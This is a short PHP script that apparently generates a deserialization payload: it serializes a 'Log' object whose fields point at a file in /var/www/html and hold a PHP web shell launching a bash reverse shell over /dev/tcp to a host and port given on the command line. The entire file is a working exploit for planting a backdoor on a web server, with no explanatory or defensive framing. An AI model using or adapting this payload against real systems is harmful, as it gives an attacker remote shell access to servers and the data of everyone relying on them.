<?PHP

class Log {
    public function __construct($f, $m) {
        $this->f = $f;
        $this->m = $m;
    }
}

print(serialize(new Log("/var/www/html/$argv[1]", "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$argv[2]/$argv[3] 0>&1'\") ?>")));

?>